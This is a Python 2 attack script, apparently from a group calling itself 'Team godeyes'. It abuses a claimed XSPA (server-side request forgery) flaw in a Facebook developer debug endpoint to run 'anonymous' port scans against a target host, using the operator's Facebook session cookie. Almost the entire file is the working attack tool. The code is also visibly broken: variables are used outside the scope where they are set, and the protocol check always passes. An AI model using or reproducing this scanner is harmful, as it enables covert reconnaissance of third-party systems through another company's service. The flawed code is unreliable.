#!/usr/bin/python
#- * -coding: utf - 8 - * -
import requests

print """\033[1;34m          _   _                  
     wongNdeso | \ | |   Team godeyes          
       __ __   ___ |  \| |_ __ ___   __ _ _ __  
       | '_ \ / _ \| . ` | '_ ` _ \ / _` | '_ \ 
       | | (_) | |\  | | | | | | (_| | |_) |
       |_| |_|\___/|_| \_|_| |_| |_|\__,_| .__/ 
                                         | |    
  Perform anonymous port scans           |_|
  using Facebook's XSPA vulnerability   \033[1;m"""

def scanner():
    ports = ['21','22','23','25','53','80','110','135','139','143','161', '443','445','3306','8080','8443','5432']

    headers =  {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0',
        'Host': 'developers.facebook.com',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Encoding': '',
        'Cookie': cookie
    }
    url = 'https://developers.facebook.com/tools/debug/echo/?q=' + target + ':' + port + '/'

    for port in ports:
        try:
            response = requests.get(url, headers = headers, timeout = 5)
            if 'connect timed out after' in response.text:
                print '\033[1;31m [+] Port %s is closed\033[1;m'%port
            elif '/html' in response.text:
                print '\033[1;32m [+] Port %s is open\033[1;m'%port
            else:
                print '\033[1;31m [+] Port %s is closed\033[1;m\033[1;m'%port
        except:
            print '\033[1;31m [+] Port %s is closed\033[1;m'%port

def menu():
    target = raw_input("\n\033[97m [?] Enter the target: \033[1;m")
    cookie = raw_input("\n\033[97m [?] Enter facebook cookie: \033[1;m")
    if 'http://' not in target or 'https://' not in target:
       target = "http://" + target
    scanner()
menu()
